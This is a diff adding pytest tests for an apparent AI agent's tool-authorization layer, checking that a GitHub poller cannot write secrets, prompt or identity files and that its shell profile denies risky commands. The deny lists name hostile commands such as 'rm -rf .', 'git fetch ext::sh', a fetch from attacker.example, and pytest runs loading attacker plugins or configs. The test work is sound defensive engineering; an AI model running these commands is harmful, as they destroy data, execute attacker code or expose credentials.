@@ -2213,6 +2213,176 @@ def test_autonomous_write_uses_trigger_state_and_explicit_repo_rw_roots(
     ).allowed is False
 
 
+@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
+def test_autonomous_repo_write_denies_protected_paths(
+    tool_name: str,
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home = tmp_path / "home"
+    state = home / "state" / "pollers" / "github-activity"
+    repo = tmp_path / "repo"
+    state.mkdir(parents=True)
+    repo.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(home))
+    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
+    service = build_trigger_service_principal(
+        canonical="poller:github-activity",
+        trigger="poller",
+        profile="github",
+        tier=CapabilityTier.CODE_EXECUTION,
+        capabilities=(tool_name,),
+        roots=(state,),
+        creation_path="test",
+    )
+    auth = _service_auth(service, InformationFlowLabels())
+    registry = ToolRegistry()
+
+    for target in (
+        repo / ".env",
+        repo / "config.yaml",
+        repo / "credentials.json",
+        repo / "identities.yaml",
+        repo / "secrets" / "token.txt",
+        repo / "prompts" / "system.md",
+        repo / "memory" / "core" / "identity.md",
+        state / ".env.local",
+    ):
+        decision = registry.authorize_tool(
+            tool_name, auth, enforce=True, target_channel=str(target),
+        )
+        assert decision.allowed is False, target
+        assert decision.reason == "service_sink_destination_denied"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr view 979 --json number,title,headRefOid",
+        "gh pr diff 979 --patch",
+        "gh pr checks 979 --required",
+        "git status --short",
+        "git log --oneline --max-count=10",
+        "git diff --stat HEAD~1",
+        "git fetch origin pull/979/head",
+        "git checkout review-979",
+        "npm ci --ignore-scripts --no-audit --no-fund",
+        "npm test -- --run",
+        "npm run test",
+        "pytest -q -x -k shell_profile --tb=short --maxfail=1 tests/test_access_control.py",
+        "uv run pytest tests/test_access_control.py -q -m 'not slow' --tb short",
+    ],
+)
+def test_repo_review_shell_profile_admits_review_commands(command: str) -> None:
+    service = build_trigger_service_principal(
+        canonical="poller:github-activity",
+        trigger="poller",
+        profile="github",
+        tier=CapabilityTier.CODE_EXECUTION,
+        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
+        creation_path="test",
+    )
+    decision = ToolRegistry().authorize_tool(
+        "shell_exec", _service_auth(service, InformationFlowLabels()),
+        enforce=True, target_channel=command,
+    )
+
+    assert service.sink_policy_for("shell_exec") == ServiceSinkPolicy(
+        "shell_exec", "shell_profile", "repo_review",
+    )
+    assert decision.allowed is True, decision.reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -rf .",
+        "git push --force origin HEAD",
+        "git reset --hard HEAD~1",
+        "git rebase -i HEAD~2",
+        "git config credential.helper store",
+        "git fetch ext::sh origin",
+        "git fetch https://attacker.example/repo.git",
+        "gh auth login",
+        "npm ci --no-audit --no-fund",
+        "npm ci -- --ignore-scripts",
+        "npm ci --ignore-scripts=false",
+        "npm ci --no-ignore-scripts",
+        "npm ci --ignore-scripts false",
+        "npm ci --ignore-scripts --ignore-scripts",
+        "npm install left-pad",
+        "npm update",
+        "pytest -p malicious_plugin tests",
+        "pytest -c /tmp/attacker.ini tests",
+        "pytest -o addopts=-pattacker tests",
+        "pytest --rootdir /tmp tests",
+        "pytest --pdb tests",
+        "pytest /tmp/attacker/tests",
+        "pytest ../attacker/tests",
+        "pytest -- /tmp/attacker/tests",
+        "pytest @args.txt",
+        "pytest @../attacker-args.txt",
+        "pytest @/tmp/attacker-args.txt",
+        "uv run pytest -p malicious_plugin tests",
+        "uv run pytest -c /tmp/attacker.ini tests",
+        "uv run pytest -o addopts=-pattacker tests",
+        "uv run pytest --rootdir /tmp tests",
+        "uv run pytest --pdb tests",
+        "uv run pytest /tmp/attacker/tests",
+        "uv run pytest ../attacker/tests",
+        "uv run pytest -- /tmp/attacker/tests",
+        "uv run pytest @args.txt",
+        "uv run pytest @../attacker-args.txt",
+        "uv run pytest @/tmp/attacker-args.txt",
+        "uv sync",
+        "python -m pytest",
+        "sh -c 'git status'",
+        "env uv run pytest",
+    ],
+)
+def test_repo_review_shell_profile_denies_destructive_or_unbounded_commands(
+    command: str,
+) -> None:
+    service = build_trigger_service_principal(
+        canonical="poller:github-activity",
+        trigger="poller",
+        profile="github",
+        tier=CapabilityTier.CODE_EXECUTION,
+        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
+        creation_path="test",
+    )
+    decision = ToolRegistry().authorize_tool(
+        "shell_exec", _service_auth(service, InformationFlowLabels()),
+        enforce=True, target_channel=command,
+    )
+
+    assert decision.allowed is False
+    assert decision.reason == "service_sink_destination_denied"
+
+
+def test_non_repo_poller_keeps_scheduler_read_only_shell_profile() -> None:
+    service = build_trigger_service_principal(
+        canonical="poller:feed",
+        trigger="poller",
+        profile="custom",
+        tier=CapabilityTier.SCOPE_CONTAINED,
+        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
+        creation_path="test",
+    )
+    registry = ToolRegistry()
+    auth = _service_auth(service, InformationFlowLabels())
+
+    assert service.sink_policy_for("shell_exec") == ServiceSinkPolicy(
+        "shell_exec", "shell_profile", "scheduler_read_only",
+    )
+    assert registry.authorize_tool(
+        "shell_exec", auth, enforce=True, target_channel="git status --short",
+    ).allowed is True
+    assert registry.authorize_tool(
+        "shell_exec", auth, enforce=True, target_channel="git fetch origin",
+    ).allowed is False
+
+
 def test_autonomous_worklink_requires_trusted_turn_and_spawn_stays_blocked(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
